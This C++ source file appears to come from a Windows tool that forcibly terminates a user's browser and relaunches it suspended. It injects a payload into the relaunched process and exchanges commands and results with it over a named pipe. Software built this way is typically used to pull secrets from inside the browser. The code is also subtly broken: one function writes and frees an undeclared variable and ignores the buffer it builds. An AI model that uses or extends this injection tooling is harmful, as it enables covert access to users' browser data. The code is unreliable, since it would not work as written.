

#include "injector_api.hpp"
#include <windows.h>
#include "../core/common.hpp"
#include "../core/console.hpp"
#include "../sys/internal_api.hpp"
#include "browser_discovery.hpp"
#include "browser_terminator.hpp"
#include "process_manager.hpp"
#include "pipe_server.hpp"
#include "injector.hpp"
#include <iostream>
#include "../payload/messages.hpp"

namespace Injector {

static const uint32_t kMaxMessageSize = 4096; // Define a maximum message size for the buffer

int Process(Payload::Request& request)
{
    BrowserInfo browser;
    Core::Console console(true);
    bool killFirst = true;

    // get message type from request
    uint32_t message_type = request.request->command_id;
    try {
        if (killFirst) {
            console.Debug("Terminating browser processes...");
            BrowserTerminator terminator(console);
            TerminationOptions opts;
            opts.terminateChildren = true;
            opts.waitForExit = true;
            auto termStats = terminator.KillByExeName(browser.exeName, opts);
            if (termStats.processesTerminated > 0) {
                std::string pidList;
                for (size_t i = 0; i < termStats.terminatedPids.size(); ++i) {
                    if (i > 0) pidList += ", ";
                    pidList += std::to_string(termStats.terminatedPids[i]);
                }
                console.Debug("  [+] Processes terminated (PID: " + pidList + ")");
            } else {
                console.Debug("  [+] No running processes found");
            }
            Sleep(300);
        }

        console.Debug("Creating suspended process: " + Core::ToUtf8(browser.fullPath));
        ProcessManager procMgr(browser);
        procMgr.CreateSuspended();
        console.Debug("  [+] Process created (PID: " + std::to_string(procMgr.GetPid()) + ")");
        PipeServer_EXT pipe(browser.type);
        pipe.Create();
        console.Debug("  [+] IPC pipe established: " + Core::ToUtf8(pipe.GetName()));
        PayloadInjector injector(procMgr, console);
        injector.Inject(pipe.GetName());

        console.Debug("Awaiting payload connection...");
        // TODO: Add timeout handling for WaitForClient
        pipe.WaitForClient(true, 3000); // 3 seconds timeout
        console.Debug("  [+] Payload connected");

        // Send the request and wait for the response
        int retcode = pipe.Send(request, true);
        // The response is now available in request.response
        if (retcode != 0) {
            console.Error("Failed to send request or receive response");
            return -1;
        }
        procMgr.Terminate();
    } catch (const std::exception& e) {
        console.Error(std::string(e.what()));
        return -1;
    }

    return 0;
}

int PipeServer_EXT::Send(Payload::Request& request, bool verbose)
{
    SendMessage(*request.request, verbose);
    WaitResponse(*request.request, *request.response, verbose, 5000); // 5 seconds timeout
    return 0;
}

void PipeServer_EXT::SendMessage(const Payload::request_msg &request, bool verbose)
{
    DWORD written = 0;
    uint32_t requestSize = request.size();
    char* buffer = new char[Payload::calculate_pack_size(requestSize)];
    memcpy(buffer, Payload::s_start_signal_vec.data(), Payload::s_start_signal_vec.size());
    request.SerializeTo(buffer + Payload::s_start_signal_vec.size(), requestSize);
    memcpy(buffer + Payload::s_start_signal_vec.size() + requestSize, Payload::s_end_signal_vec.data(), Payload::s_end_signal_vec.size());

    if (!WriteFile(m_hPipe.get(), packed.first, static_cast<DWORD>(packed.second), &written, nullptr)) {
        throw std::runtime_error("WriteFile failed");
    }

    if (written != packed.second) {
        throw std::runtime_error("Incomplete write to pipe");
    }
    delete[] packed.first;
}


// TODO: we only expected to smaller size response
void PipeServer_EXT::WaitResponse(const Payload::request_msg &request, Payload::response_msg &response, bool verbose, uint32_t timeout)
{
    DWORD startTime = GetTickCount();
    DWORD deadLine = startTime + timeout;
    DWORD bytesRead = 0;
    char buffer[kMaxMessageSize]; // Adjust size as needed
    TemporalBuffer tempBuffer;

    while (GetTickCount() < deadLine) {
        // TODO: should check for start signature and end signature in the response buffer to determine if the response is complete
        DWORD available = 0;
        if (!PeekNamedPipe(m_hPipe.get(), nullptr, 0, nullptr, &available, nullptr)) {
            if (GetLastError() == ERROR_BROKEN_PIPE) break;
            throw std::runtime_error("PeekNamedPipe failed");
        }

        if (available == 0) {
            Sleep(100);
            continue;
        }

        DWORD read = 0;
        if (!ReadFile(m_hPipe.get(), buffer, sizeof(buffer) - 1, &read, nullptr) || read == 0) {
            if (GetLastError() == ERROR_BROKEN_PIPE) break;

            // Try to read again after a short delay
            Sleep(100);
            continue;
        }

        if (Payload::is_valid_msg(buffer, read)) {
            Payload::unpack(buffer, read, &response.payload, response.payload_length);
            break;
        } else {
            throw std::runtime_error("Invalid message received");
        }
    }
}

void PipeServer_EXT::WaitAck(const Payload::request_msg &request, bool verbose, uint32_t timeout)
{
    uint32_t crc32 = Payload::calculate_crc32(request.payload, request.payload_length);
    uint32_t deadline = GetTickCount() + timeout;
    while (GetTickCount() < deadline) {
        DWORD available = 0;
        if (!PeekNamedPipe(m_hPipe.get(), nullptr, 0, nullptr, &available, nullptr)) {
            if (GetLastError() == ERROR_BROKEN_PIPE) break;
            throw std::runtime_error("PeekNamedPipe failed");
        }

        if (available == 0) {
            Sleep(100);
            continue;
        }

        char buffer[16]; // Assuming ACK message is small
        DWORD read = 0;
        if (!ReadFile(m_hPipe.get(), buffer, sizeof(buffer) - 1, &read, nullptr) || read == 0) {
            if (GetLastError() == ERROR_BROKEN_PIPE) break;
            Sleep(100);
            continue;
        }

        // Check for ACK message and validate CRC32
        uint32_t receivedCrc32 = *reinterpret_cast<uint32_t*>(buffer);
        if (receivedCrc32 == crc32) {
            return; // ACK received successfully
        }
    }
}

void PipeServer_EXT::SendAck(const Payload::request_msg &request, bool verbose, uint32_t timeout)
{
    uint32_t crc32 = Payload::calculate_crc32(request.payload, request.payload_length);
    DWORD written = 0;
    if (!WriteFile(m_hPipe.get(), &crc32, sizeof(crc32), &written, nullptr)) {
        throw std::runtime_error("WriteFile failed for ACK");
    }

    if (written != sizeof(crc32)) {
        throw std::runtime_error("Incomplete write for ACK");
    }

}

void PipeServer_EXT::WaitForClient(bool verbose, uint32_t timeout)
{
    uint32_t deadline = GetTickCount() + timeout;
    while (GetTickCount() < deadline) {
        DWORD available = 0;
        if (!PeekNamedPipe(m_hPipe.get(), nullptr, 0, nullptr, &available, nullptr)) {
            if (GetLastError() == ERROR_BROKEN_PIPE) break;
            throw std::runtime_error("PeekNamedPipe failed");
        }

        if (available > 0) {
            return; // Client connected
        }

        Sleep(100);
    }
    throw std::runtime_error("Timeout waiting for client");
}

} // namespace Injector